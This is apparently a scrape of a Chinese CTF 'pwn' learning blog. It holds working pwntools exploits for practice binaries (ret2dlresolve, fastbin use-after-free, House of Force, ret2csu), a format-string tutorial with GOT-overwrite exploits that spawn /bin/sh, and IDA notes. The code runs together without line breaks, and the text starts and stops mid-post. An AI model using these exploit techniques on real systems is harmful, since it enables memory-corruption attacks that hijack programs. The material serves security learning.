Ret2dlresolvePayload(elf,symbol=&quot;system&quot;,args=[&quot;/bin/sh&quot;])rop.ret2dlresolve(dlresolve)raw_rop = rop.chain()io = process(&quot;./baby_pwn&quot;)payload = flat(&#123;44:raw_rop,256:dlresolve.payload&#125;)io.sendline(payload)io.interactive() Heapfastbin_attack_uaf12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from pwn import *libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;&#x27;&#x27;&#x27;if args[&#x27;REMOTE&#x27;]: p = remote(&quot;&quot;)else: &#x27;&#x27;&#x27;p = process([&quot;/glibc/2.23/32/lib/ld-2.23.so&quot;,&quot;./&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.23/32/lib/libc.so.6&quot;&#125;)def cmd(idx): p.recvuntil(&quot;Your choice :&quot;) p.sendline(str(idx))def add(size,content): cmd(1) p.recvuntil(&#x27;Note size :&#x27;) p.sendline(str(size)) p.recvuntil(&quot;Content :&quot;) p.sendline(content)def free(idx): cmd(2) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx))def put(idx): cmd(3) p.recvuntil(&#x27;Index :&#x27;) p.sendline(str(idx)) add(0x20,b&quot;aabb&quot;)#chunk0 [chunk0_print(0x10),chunk0_content(0x20)]add(0x20,b&quot;aabb&quot;)#chunk1 [chunk0_print(0x10),chunk0_content(0x20)]free(0)&#x27;&#x27;&#x27;main_arena =&gt; chunk0_print(0x10) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;free(1)&#x27;&#x27;&#x27;fastbin:main_arena =&gt; chunk1_print(0x10) =&gt; chunk0_print(0x10) main_arena =&gt; chunk1_content(0x20) =&gt; chunk0_content(0x20)&#x27;&#x27;&#x27;gdb.attach(p)add(8,p32(magic))#chunk2, with 0x10 puts_field and 0x8 content field ,the memory space is poniter to chunk1_print and chunk0_print put(0)p.interactive() House of Force123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869from pwn import *libc = ELF(&quot;./libc.so.6&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;p = process([&quot;/glibc/2.19/32/lib/ld-2.19.so&quot;,&quot;./&quot;],env=&#123;&quot;LD_PRELOAD&quot; : &quot;/glibc/2.19/32/lib/libc-2.19.so&quot;&#125;)#p = process(&#x27;./&#x27;)elf = ELF(&#x27;./&#x27;)top_chunk_addr = malloc_hook_addr = atoi_got_addr = elf.got[&#x27;atoi&#x27;]free_got_addr = elf.got[&#x27;free&#x27;]printf_plt_addr = elf.plt[&#x27;printf&#x27;]def cmd(idx): p.recvuntil(&quot;option---&gt;&gt;&quot;) p.sendline(str(idx))def add(size,content): cmd(1) p.recvuntil(&quot;Input the length of the note content:&quot;) p.sendline(str(size)) p.recvuntil(&quot;Input the content:&quot;) p.sendline(content)def edit(idx,content): cmd(3) p.recvuntil(&quot;Input the id:&quot;) p.sendline(str(idx)) p.recvuntil(&quot;Input the new content:&quot;) p.sendline(content)def free(idx): cmd(4) p.recvuntil(&quot;Input the id:&quot;) p.sendline(str(idx))def sync(): cmd(5) def exit(): cmd(6)p.recvuntil()p.sendline()p.recvuntil()heap_base = u32(p.recv(4))log.success(&#x27;heap_base: &#x27; + hex(heap_base))p.recvuntil()p.sendlineafter()#gdb.attach(p)p.sendlineafter(, p32(0xffffffff))offset = heap_base - malloc_hook_addr - 0xd0 + 0x8add(offset,b&#x27;a&#x27;)#chunk0,change top chunk ptrlibc_base = atoi_addr - libc.symbols[&#x27;atoi&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]edit(3,p32(system_addr))add(10,b&#x27;/bin/sh\\x00&#x27;)p.interactive()","categories":[{"name":"Generalization","slug":"Generalization","permalink":"https://fuurinko.github.io/categories/Generalization/"}],"tags":[{"name":"summary","slug":"summary","permalink":"https://fuurinko.github.io/tags/summary/"}]},{"title":"jarvisoj_level5","slug":"stack_ret2csu","date":"2022-03-19T17:15:06.878Z","updated":"2022-04-09T08:31:14.216Z","comments":true,"path":"2022/03/20/stack_ret2csu/","link":"","permalink":"https://fuurinko.github.io/2022/03/20/stack_ret2csu/","excerpt":"","text":"jarvisoj_level5​ 这个题吧，我好像以前做过，是个纯纯的ret2csu的板子题。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364from pwn import*from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;#libc = ELF(&quot;&quot;)elf = ELF(&quot;./level3_x64&quot;)p = process(&quot;./level3_x64&quot;)0ffset = 0x88#(test)csu_front_addr = 0x400690csu_end_addr = 0x4006AAputs_plt = elf.plt[&#x27;puts&#x27;]libc_start_main_got = elf.got[&#x27;__libc_start_main&#x27;]main = elf.symbols[&#x27;main&#x27;]write_got = elf.got[&#x27;write&#x27;]read_got = elf.got[&#x27;read&#x27;]main_addr = elf.symbols[&#x27;main&#x27;]def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b&#x27;a&#x27; * offset payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += &#x27;a&#x27; * (offset - 0x48) payload += p64(last) p.send(payload) sleep(1)csu(0, 1, write_got, 8, write_got, 1, main_addr)write_addr = u64(p.recv(8))libc = LibcSearcher(&#x27;write&#x27;, write_addr)libc_base = write_addr - libc.dump(&#x27;write&#x27;)execve_addr = libc_base + libc.dump(&#x27;execve&#x27;)log.success(&#x27;execve_addr &#x27; + hex(execve_addr))&#x27;&#x27;&#x27;libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)log.success(&#x27;system_addr &#x27; + hex(system_addr))&#x27;&#x27;&#x27;csu(0, 1, read_got, 16, bss_base, 0, main_addr)p.send(p64(execve_addr) + &#x27;/bin/sh\\x00&#x27;)p.recvuntil(&#x27;Hello, World\\n&#x27;)## execve(bss_base+8)csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr)p.sendline(payload)p.interactive()","categories":[{"name":"STACK - Stack Overflow","slug":"STACK-Stack-Overflow","permalink":"https://fuurinko.github.io/categories/STACK-Stack-Overflow/"}],"tags":[{"name":"ret2csu","slug":"ret2csu","permalink":"https://fuurinko.github.io/tags/ret2csu/"}]},{"title":"格式化字符串","slug":"stack_learning_fmt","date":"2022-03-18T17:22:00.000Z","updated":"2022-10-24T01:38:06.812Z","comments":true,"path":"2022/03/19/stack_learning_fmt/","link":"","permalink":"https://fuurinko.github.io/2022/03/19/stack_learning_fmt/","excerpt":"","text":"1）前言​ 绿盟杯pwn1，格式化字符串+沙盒orw。保护全开。 ​ 首先对于格式化字符串我的理解就不是很深刻，甚至从来没有完整地刷过一道格式化字符串的题目。 ​ 所以碰到这道题，算是又给我敲了第nn个警钟。 ​ 非常清晰地告诉我：我是垃圾。 2）格式化字符串基本原理​ ctfwiki上的格式化字符串教程写得挺好的，可以参考。 格式化字符串参数1%[parameter][flags][field width][.precision][length]type parameter %n$，获取格式化字符串中的指定参数 field width 输出的最小宽度 precision 输出的最大长度 length，输出的长度 hh，输出一个字节 h，输出一个双字节 type d/i，有符号整数 u，无符号整数 x/X，16 进制 unsigned int 。x 使用小写字母；X 使用大写字母。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 o，8 进制 unsigned int 。如果指定了精度，则输出的数字不足时在左侧补 0。默认精度为 1。精度为 0 且值为 0，则输出为空。 s，如果没有用 l 标志，输出 null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了 l 标志，则对应函数参数指向 wchar_t 型的数组，输出时把每个宽字符转化为多字节字符，相当于调用 wcrtomb 函数。 c，如果没有用 l 标志，把 int 参数转为 unsigned char 型输出；如果用了 l 标志，把 wint_t 参数转为包含两个元素的 wchart_t 数组，其中第一个元素包含要输出的字符，第二个元素为 null 宽字符。 p， void * 型，输出对应变量的值。printf(“%p”,a) 用地址的格式打印变量 a 的值，printf(“%p”, &amp;a) 打印变量 a 所在的地址。 n，不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。 格式化字符串漏洞利用一般来说就是打印变量的时候并没有对变量进行格式化，或者格式化的方式并不正确。 一般来说不正确的方式有这几种 一直%s，容易引用不合法的地址，造成程序崩溃 通过打印的相关内存信息，泄露内存布局，获得有用的信息 重点研究如何计算32/64位程序中格式化字符串在栈上的偏移，以及研究自动化求偏移的实现 1）32位偏移计算原理​ 其实这个计算确实是有手就行，只需要在栈上找到对应的格式化字符串，然后数是第几个，再减去返回地址所占的一个位置，就是偏移量。 ​ 准确来说应该是格式化字符串在栈上的偏移。 ​ 原理也比较简单：x86架构下，格式化字符串是通过栈传递的。 ​ 然后联想一下函数调用栈的知识点，格式化字符串本身和printf的参数一样，从右到左依次被压栈。 ​ 举一个例子，源码来源于3.1.1 格式化字符串漏洞 12345//test1.c#include&lt;stdio.h&gt;void main() &#123; printf(&quot;%s %d %s&quot;, &quot;Hello World!&quot;, 233, &quot;\\n&quot;);&#125; ​ 这个程序没有任何的漏洞，只是因为非常简单直观，拿来研究printf函数参数的传参。 ​ 我们以32位编译。 1gcc -m32 test1.c -o test1 ​ 在main函数处下一个断点。然后执行到断点处。 ​ 随便多单步几次，可以看到push指令，此刻主调函数已经开始向栈中压入参数了，从stack 部分我们可以看到，此时栈里已经有一个参数”\\n”。 ​ 继续单步，观察栈的变化，此时栈顶已经扩大了很多，printf的所有需要的参数都在栈中。然后我们需要调用printf函数。 ​ 可以看到，这条指令call printf，我们刚刚压栈的参数此时被printf使用。执行完后的下一条指令使esp加0x10，栈空间缩小，回到最初的样子： ​ 然后回忆一下被调函数参数和局部变量压栈的过程： ​ 主调函数将被调函数参数从右到左压入栈中，随后将返回地址压栈，此时，栈上的参数偏移的计算就非常清晰了。 ​ 这里可能有些弯需要理解一下。大致就是刚刚说到的，主调函数首先将printf需要的函数从右到左依次压栈，（正好栈是从高地址向低地址增长的，所以在gdb stack中呈现的顺序是正常理解的从左到右的先后次序），当将printf需要的参数全部存到栈中后，即可调用printf使用这些参数，此时的栈帧尚属于主调函数，在这个程序中我们不考虑返回地址，所以当参数全部入栈，printf即被调用，栈顶也指向格式化字符串所在的地址。在这里，格式化字符串就是栈上的第一个参数，偏移量就是1。当printf调用完毕，参数即出栈，也就不存在什么格式化字符串偏移了。 2）64位偏移计算原理​ 原理同32位，但是由于64位传参的规则，是先用6个寄存器传参，如果不够再使用栈，但格式化字符串参数被设置是通过栈传递的，所以实际上格式化字符串在栈上是第n+6个参数。 3） pwntools_fmtstr工具​ 在前面的分析中我们可以看到，其实找到格式化字符串的偏移量是一件非常简单的事情，都1202年了，既然是简单的步骤，我们应该需要学会运用自动化工具，使做题步骤简化，比如偏移量的寻找，以及与格式化字符串利用相关的一些事。 ​ pwntools就非常人性化地为我们集成了格式化字符串偏移量寻找，got表覆盖等非常常见好用的操作，这里我们通过简单的例子，着重讨论这些自动化脚本编写的原理。 例子​ 例如，这是一段自动化的格式化字符串漏洞利用的脚本，主要适用于rop并改got表的板子题。 12345678910111213141516171819202122232425262728293031323334from pwn import *elf = ELF(&#x27;./&#x27;)r = process(&#x27;./&#x27;)libc = ELF(&#x27;/&#x27;)# 计算偏移量def exec_fmt(payload): r.sendline(payload) info = r.recv() return info auto = FmtStr(exec_fmt)offset = auto.offset# 获得 func 的 got 地址func_got = elf.got[&#x27;func&#x27;]#func通常是一些例如printf或puts的函数log.success(&quot;func_got =&gt; &#123;&#125;&quot;.format(hex(func_got)))# 获得 func 的真实地址payload = p32(func_got) + &#x27;%&#123;&#125;$s&#x27;.format(offset)r.send(payload)func_addr = u32(r.recv()[4:8])log.success(&quot;func_addr =&gt; &#123;&#125;&quot;.format(hex(func_addr)))# 获得 system 的真实地址system_addr = func_addr - (libc.symbols[&#x27;func&#x27;] - libc.symbols[&#x27;system&#x27;])log.success(&quot;system_addr =&gt; &#123;&#125;&quot;.format(hex(system_addr)))payload = fmtstr_payload(offset, &#123;func_got : system_addr&#125;)r.send(payload)r.send(&#x27;/bin/sh&#x27;)r.recv()r.interactive() ​ ​ 其中脚本的核心就是pwntools的fmtstr功能。fmtstr几乎完全自动化地帮我们完成了偏移寻找，got表覆盖等工作，大大简化了我们的做题流程。 源码分析​ pwntools定义了一个FmtStr类，来实现格式化字符串漏洞的利用。 ​ ps：了解该源码分析需要首先了解简单的面向对象的python程序设计。因为我也不太懂，所以画了个图来归纳一下，大概就是： ​ 所以下图中的代码也就能够理解了，就是将参数传入实例本身。 ​ 然后，是功能实现的第一步–偏移的寻找，也是这篇笔记重点要分析的部分，完整的源码分析会写成一个新的系列。 ​ 很显然这个功能的实现是基于find_offset方法。 ​ 方法的内容其实比较简单： 1234567891011def find_offset(self): marker = cyclic(20)#cyclic 20个字符 for off in range(1,1000):#从1-1000，爆破偏移量 leak = self.leak_stack(off, marker) leak = pack(leak)#leak = p(leak_stack) pad = cyclic_find(leak[:4]) if pad &gt;= 0 and pad &lt; 20: return off, pad else: log.error(&quot;Could not find offset to format string on stack&quot;) return None, None ​ 而实现方法find_offset，又依靠方法leak_stack 123456789def leak_stack(self, offset, prefix=b&quot;&quot;): payload = b&quot;START%%%d$pEND&quot; % offset leak = self.execute_fmt(prefix + payload) try: leak = re.findall(br&quot;START(.*?)END&quot;, leak, re.MULTILINE | re.DOTALL)[0] leak = int(leak, 16) except ValueError: leak = 0 return leak ​ cyclic的代码也顺便放一放（ 12345678910111213141516171819202122232425def cyclic_find(subseq, alphabet = None, n = None): if n is None: n = context.cyclic_size if isinstance(subseq, six.integer_types): subseq = packing.pack(subseq, bytes=n) subseq = packing._need_bytes(subseq, 2, 0x80) if len(subseq) != n: log.warn_once(&quot;cyclic_find() expects %i-byte subsequences by default, you gave %r\\n&quot; &quot;Unless you specified cyclic(..., n=%i), you probably just want the first 4 bytes.\\n&quot; &quot;Truncating the data at 4 bytes. Specify cyclic_find(..., n=%i) to override this.&quot;, n, subseq, len(subseq), len(subseq)) subseq = subseq[:n] if alphabet is None: alphabet = context.cyclic_alphabet alphabet = packing._need_bytes(alphabet, 2, 0x80) if any(c not in alphabet for c in subseq): return -1 n = n or len(subseq) return _gen_find(subseq, de_bruijn(alphabet, n)) ​ 之前一直对cyclic的实现抱有兴趣，抽个时间可以看看源码分析。 ​ 3）实际利用1:goodluck话不多说，直接上例子。 程序逻辑分析第一步，清晰而准确的逆向是漏洞点利用的基础。 首先，程序读取flag，通过_IO_getc(fp)，一个字符一个字符地将flag读入v10。 然后将flag的首地址给v9。 然后刷新缓冲区。这里这个fflush函数，以前没有怎么深入了解过（ 然后看一个关于fflush的详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） 但是文章中讲的是stdin，和这里的bss段关联感觉并不大，我疑惑的地方不是为什么要fflush，而是疑惑bss段有什么东西。 bss段存储未初始化的全局变量，也不是缓冲区吧。 缓冲区从一个简单的fflush函数中，我们试图理解缓冲区的原理和这个函数被设置的意义。 为了减少cpu对磁盘的读写次数，提高运行速度，缓冲区（这里特指buf）存储了我们的键盘，屏幕输入输出。当我们将字符通过键盘输入到缓冲区中，cingetchar函数再从缓冲区中读取我们的键盘输入，从而进行数据的操作。屏幕输出也是同理。 缓冲区的分类1:全缓冲。只有在缓冲区被填满之后才会进行I/O操作；最典型的全缓冲就是对磁盘文件的读写。 2:行缓冲只有在输入或者是输出中遇到换行符的时候才会进行I/O操作；这忠允许我们一次写一个字符，但是只有在写完一行之后才做I/O操作。一般来说，标准输入流(stdin)和标准输出流(stdout)是行缓冲 3:无缓冲 无缓冲；标准I/O不缓存字符；其中表现最明显的就是标准错误输出流(stderr)，这使得出错信息尽快的返回给用户。 （我以前一直不是很能理解为什么要专门设置一个标准错误，现在知道了，如果error的输出有缓冲区的话，可能要等程序执行到最后才会报错，这样就不能即时地接收到报错） fflush函数然后是关于fflush函数的glibc源码。 fflush实际是调用vtable中的函数_IO_new_file_sync，这个函数的源码如图： （/glibc-2.23/libio/fileops.c:867） 12345678910111213141516171819202122232425262728293031323334int_IO_new_file_sync (_IO_FILE *fp)&#123; _IO_ssize_t delta; int retval = 0; /* char* ptr = cur_ptr(); */ if (fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base) if (_IO_do_flush(fp)) return EOF;//end of file delta = fp-&gt;_IO_read_ptr - fp-&gt;_IO_read_end; if (delta != 0) &#123;#ifdef TODO if (_IO_in_backup (fp)) delta -= eGptr () - Gbase ();#endif _IO_off64_t new_pos = _IO_SYSSEEK (fp, delta, 1); if (new_pos != (_IO_off64_t) EOF) fp-&gt;_IO_read_end = fp-&gt;_IO_read_ptr;#ifdef ESPIPE else if (errno == ESPIPE) ; /* Ignore error from unseekable devices. */#endif else retval = EOF; &#125; if (retval != EOF) fp-&gt;_offset = _IO_pos_BAD; /* FIXME: Cleanup - can this be shared? */ /* setg(base(), ptr, ptr); */ return retval;&#125;libc_hidden_ver (_IO_new_file_sync, _IO_file_sync) 虽然但是，真的看不懂，那些调用的函数是啥功能都不知道。 pwntools与缓冲区机制某些pwn题为了增加难度，会设置题目默认缓冲区存在，从而使pwntools的对于数据的发送与接收产生问题，一是远端的输出并不会及时回显，另外是数据累积在缓冲区内，对远端数据的正常接收造成影响。 为了搞清这种影响是如何产生的，以及如何解决，我们将从pwntools的源码层面研究pwntools与远端服务器的交互，从而彻底探明这一问题。详见pwntools源码剖析（1）–以源码的角度分析io交互原理 %ms？从缓冲区的研究回到程序的简单逻辑分析上。 __isoc99_scanf(&quot;%ms&quot;, &amp;format); 接着就来了这么一句，我第一次听说m这个参数，其实就是动态的分配了scanf的缓冲区，有效避免了溢出。（stackoverflow上回答废话一堆，说得云里雾里） 然后接着又是一个手写的read函数，再将输入的字符串赋给v4，再将v4与flag比较，如果错误，就来一个格式化字符串的漏洞。 漏洞利用因为程序其实已经拿到flag了，所以这道题并不需要考虑getshell。只需要通过刚才的格式化字符串漏洞，将flag打印出来。 那么如何打印这个flag呢？ 我们首先肯定要输入一个错误的flag（废话），然后进入与flag的比较，这个时候，flag的具体的值也在内存中。所以随便动调一下。 flag其实就已经出来了，但是为了学习，我们还需要将它打印出来。 这时候就需要计算这个flag字符串与栈顶的偏移。 显然flag在栈顶第四个参数的位置，除去第一行的返回地址，也就是第三个。但是由于64位程序，前6个参数是由寄存器传参，所以需要+6，也就是第九个参数。 利用%n$s打印参数，即可获得flag。 2）cctf pwn3经过刚才的开胃菜，我们总算进入了正题。 一般来说，getshell的其中一种非常常见的手法就是改函数got表为另外某个函数。尤其是没有栈溢出，并且并没有开启relro的情况下，这种手法几乎是最通用的解法。 但是如果需要修改函数的got表，我们需要满足几个条件： 知道需要修改的函数的真实地址。 需要想办法改写函数的got表。 一般来说，一个没有漏洞的程序，想要实现以上任意一点都是很难的，但是毕竟还是ctf题（ 回归正题，我们可以用格式化字符串漏洞来解决以上两个问题，详见例子 程序分析 还是先进行一个简单的逻辑分析。 首先要求登陆，然后在系统中有三个功能，get file ，put file 和show file，基本就是put一个文件，输入文件名和内容，然后可以get文件和show文件。（虽然我没看明白这个get和show函数有什么区别）显然在get file 中，存在一个格式化字符串漏洞。 所以思路其实很清晰，首先我们并不知道密码，要登录进去，还需要绕过一个密码的检测。 当我们成功登陆，直接确定格式化字符串相对栈的偏移，然后打印函数的真实地址，通过地址确定libc基址，再修改函数got表位systen的地址从而getshell，这也是一般的格式化字符串的板子题常见套路。 ps:用wiki给的exp动调一下，把断点下在发送payload之前。如果调试不当可能会造成 ERROR: Could not find ELF base! 原因详见https://fuurinko.github.io/2021/10/27/gdb附加调试的一些黑魔法/的2.1节。 绕过密码检测123456789#ask_username.c for ( i = 0; i &lt;= 39 &amp;&amp; src[i]; ++i ) ++src[i]; #ask_password.c if ( strcmp(s1, &quot;sysbdmin&quot;) ) &#123; puts(&quot;who you are?&quot;); exit(1); &#125; 进入程序会有一个比较简单的小check，我们所输入的用户名的ascii需要小于sysbdmin,可以直接用符合条件的username来绕过检测。(strcmp是以ascii码做比较的，然后如果str1比str2小，则返回一个负值。题目的检测显然需要我们返回一个负值，所以我们需要输入比sysbdmin的ascii小，但字符长度相等的字符。) 1#rxraclhm 寻找格式化字符串在栈中的偏移当我们绕过了密码，然后就需要打印puts函数的真实地址。 打印真实地址，第一步需要找到格式化字符串在栈中的偏移。 ps：关于这个偏移的寻找，其实背公式的话非常简单，但是我们需要了解其中的原理。在上一个简单的例子中我们并没有对这个原理进行一个详细的说明，是因为题目步骤实在过于简单，但是如果碰到较为复杂的题目，盲人摸象并不可取。 原理参见：https://fuurinko.github.io/2021/10/27/摆烂第六天--格式化字符串偏移计算原理/ ​ 可以看到我们输入的格式化字符串的地址位于第八个参数。 利用漏洞泄露地址​ 既然找到了格式化字符串的偏移，那么就可以利用它来泄露内存了。 12345# get the addr of putsputs_got = elf.got[&#x27;puts&#x27;]log.success(&#x27;puts got : &#x27; + hex(puts_got))put(b&#x27;aa&#x27;, b&#x27;%8$s&#x27; + p32(puts_got))puts_addr = u32(get(&#x27;1111&#x27;)[:4]) put一个名为aa的文件，内容是格式化字符串以及puts的got表地址。 这里%8$s + p32(puts_got)先把puts的got表传进去，然后再通过%8$s打印。 然后接收信息，就是puts的got表地址。 利用格式化字符串覆盖puts的got表fmt模块实现123456789payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)put(&#x27;/bin/sh;&#x27;, payload)gdb.attach(p)p.recvuntil(&#x27;ftp&gt;&#x27;)p.sendline(&#x27;get&#x27;)p.recvuntil(&#x27;enter the file name you want to get:&#x27;)p.sendline(&#x27;/bin/sh;&#x27;)show() ​ 这里其实主要的问题都是被fmtstr_payload函数解决了。 ​ 这个函数是pwntools的一个集成的功能，含义就是，格式化字符串是栈上第七个参数，然后需要将system的地址写入puts的got表地址。 ​ 关于函数是如何实现的，可以参见另外一篇笔记。格式化字符串偏移计算原理 手动实现​ 等等再写。 ​ 调用show，实现getshell最后调用show，也就是puts函数，puts的content的是binsh，就相当于getshell。 可以看到确实puts的got表被改为了system的地址。 但是感觉情况与我期待的并不一样，当调用fmt_payloadmodule的时候，puts的got表并没有被修改，而是在最后show（）的时候才突然变成了system。 ​ 发现问题所在了。system的地址根本不是system。。真的逆天，这个确实不知道该怎么办了，got表也改了，函数参数也传入了，但是地址不对。。。为什么。 完整exp：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556from pwn import*#from LibcSearcher import LibcSearchercontext.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.log_level = &quot;debug&quot;libc = ELF(&quot;/glibc/2.23/32/lib/libc-2.23.so&quot;)p = process(&quot;./pwn3&quot;)elf = ELF(&quot;./pwn3&quot;)def get(name): p.sendline(&#x27;get&#x27;) p.recvuntil(&#x27;enter the file name you want to get:&#x27;) p.sendline(name) data = p.recv() return datadef put(name, content): p.sendline(&#x27;put&#x27;) p.recvuntil(&#x27;please enter the name of the file you want to upload:&#x27;) p.sendline(name) p.recvuntil(&#x27;then, enter the content:&#x27;) p.sendline(content)def show(): p.sendline(&#x27;dir&#x27;)p.recvuntil(&#x27;Name (ftp.hacker.server:Rainism):&#x27;)p.sendline(&#x27;rxraclhm&#x27;)# get the addr of putsputs_got = elf.got[&#x27;puts&#x27;]log.success(&#x27;puts got : &#x27; + hex(puts_got))put(b&#x27;aa&#x27;, b&#x27;%8$s&#x27; + p32(puts_got))puts_addr = u32(get(&#x27;aa&#x27;)[:4])log.success(&#x27;puts_addr : &#x27; + hex(puts_addr))system_off = libc.symbols[&#x27;system&#x27;]puts_off = libc.symbols[&#x27;puts&#x27;]libc_base = puts_addr - puts_offsystem_addr = libc_base + system_offlog.success(&#x27;system addr : &#x27; + hex(system_addr))payload = fmtstr_payload(7, &#123;puts_got: system_addr&#125;)put(&#x27;/bin/sh;&#x27;, payload)gdb.attach(p)p.recvuntil(&#x27;ftp&gt;&#x27;)p.sendline(&#x27;get&#x27;)p.recvuntil(&#x27;enter the file name you want to get:&#x27;)p.sendline(&#x27;/bin/sh;&#x27;)show()p.interactive() echo1逆向​ 没啥好逆的，输入字符，然后输出字符，纯纯格式化字符串。 12345678do&#123; fgets(s, 256, stdin); printf(s);&#125;while ( strcmp(s, &quot;exit\\n&quot;) );system(&quot;echo Goodbye&quot;);exit(0); 利用​ 由于system的地址已经知道了，就没有必要再泄露，直接利用fmt模块将ptintf got覆盖就行。 1234567891011121314151617from pwn import *elf = ELF(&#x27;./echo&#x27;)#r = process(&#x27;node4.buuoj.cn&#x27;,26117)r = process(&quot;./echo&quot;)printf_got = elf.got[&#x27;printf&#x27;]printf_got = 0x804A010#system_plt = elf.plt[&#x27;system&#x27;]system_plt = 0x8048400payload = fmtstr_payload(7,&#123;printf_got:system_plt&#125;)r.sendline(payload)r.sendline(&#x27;/bin/sh;&#x27;)r.interactive() ​ 另外其实可以尝试一下手动修改。 ​ 其实就是把0x804A010改成0x8048400。 ​ 所以payload大概长这样 1payload = p32(0x804A010) + b&#x27;%xxxxc&#x27;+ b&#x27;%6$hn&#x27; ​ echo2​ 整个程序与echo1基本没有区别（估计只有编译参数不一样），但是是64位，并且开启了随机化。 ​ 并且在栈上的参数的偏移（也）是7+6 = 13。 ​ 但是值得注意的求偏移时，由于程序是64位，所以并不适合用pwntools的fmt模块，因为 ​ ​ ​ 总结​ 通过这篇笔记我确实是认识到自动化脚本的重要性，其实我觉得但凡真正入门了pwn，就不会再浪费时间于一些明明可以自动化完成的东西，就比如说rop有相应的脚本roputil，有onegadget，但是我总是拒绝去用这些东西，反而将大把时间浪费于无谓的调试以及历史脚本的复制粘贴上。 ​ 然而简单的题目尚且可以通过手工构造，如果是实战或者盲打，上哪里手工构造呢？我总有一天要面对这个东西，为什么不早点接受呢？ 参考缓冲区机制详解 C语言fflush()函数：清空文件缓冲区（或标准输入输出缓冲区） difference between %ms and %s scanf 格式化字符串 [格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测](格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测) pwnlib.fmtstr— Format string bug exploitation tools 格式化字符串利器fmtstr_payload | 攻防世界 pwn进阶区 实时数据监测 pwntools中fmtstr的使用 3.1.1 格式化字符串漏洞 Python中self用法详解 ​","categories":[{"name":"STACK - Format","slug":"STACK-Format","permalink":"https://fuurinko.github.io/categories/STACK-Format/"}],"tags":[{"name":"FMT","slug":"FMT","permalink":"https://fuurinko.github.io/tags/FMT/"}]},{"title":"ida的结构体识别","slug":"mess_ida的结构体识别","date":"2022-03-17T12:35:07.220Z","updated":"2022-04-17T12:06:32.516Z","comments":true,"path":"2022/03/17/mess_ida的结构体识别/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/mess_ida%E7%9A%84%E7%BB%93%E6%9E%84%E4%BD%93%E8%AF%86%E5%88%AB/","excerpt":"","text":"0​ 最近发现做堆题最慢的不是调试，而是在逆向的过程中寻找思路，而一般堆题的菜单都是由结构体管理，所以如果能在ida中快速方便地查看结构体相关的指针操作就再好不过了。然而一般来说ida是无法直接识别结构体这种比较高级的数据结构的，所以需要我们手动去创建并修改。 1​ 首先可以在idastructures的界面手动添加一些结构体 ​ 右键空白处，选择add struct type，便可以新建结构体。鼠标选中ends字段，按下D可以新建字段，在当前字段再按下D可以调整字段长度。 ​ 为反汇编代码添加结构体​ ​ ​ 随便一道堆题，逻辑比较简单，几个对于字段的处理都比较直观，所以可以较为清楚地知道head结构体中的字段，然后右键head创建结构体， 然后按照实际情况调整。","categories":[{"name":"MESS","slug":"MESS","permalink":"https://fuurinko.github.io/categories/MESS/"}],"tags":[{"name":"mess","slug":"mess","permalink":"https://fuurinko.github.io/tags/mess/"}]},{"title":"2014 hack.lu oreo","slug":"week3-3.2","date":"2022-03-17T07:05:44.803Z","updated":"2022-03-20T04:33:36.836Z","comments":true,"path":"2022/03/17/week3-3.2/","link":"","permalink":"https://fuurinko.github.io/2022/03/17/week3-3.2/","excerpt":"","text":"overview​ ​ 搞不懂为什么这么多题都要stripped。 逆向add​ 申请0x38大小的chunk，user space开始处存枪支的description,+0x19处存放枪支的name。 ​ 输入name的时候，最大长度为56，导致能够溢出，覆盖fd字段。 ​ 同时每输入信息以后都会有一个保存指针的操作： free ​ 虽然free了ptr，但是会将allocaed chunk的fd字段作为free后的fd指针，存在ptr指向的地址。 ​ 可以看到bin中的fd。 show ​ ​ 打印descrption时会将fd指针所所指向的内容打印出来。 message&amp;show status ​ 注意fgets()的定义，将128字节从stdin读进notice指向的地址（bss段上），然后在show status函数中打印出来。 ​ 所以可以看到，在一般情况下，向message留言，一般内存布局是这样子的 ​ 也就是a2a8指向a2c0，所以是向a2c0写入数据。这样如果把a2a8储存的数据改为某个函数的got表，就能够实现got表的更改。 利用把fd项填为puts@got的地址，从而泄露libc基址，计算system地址​ 泄露地址利用了程序的第一个漏洞，正因为打印descrption时会将fd指针所所指向的内容打印出来，所以如果我们将其覆盖为puts()的got表地址，就能够泄露其地址。 123456add(25 * b&#x27;a&#x27;, 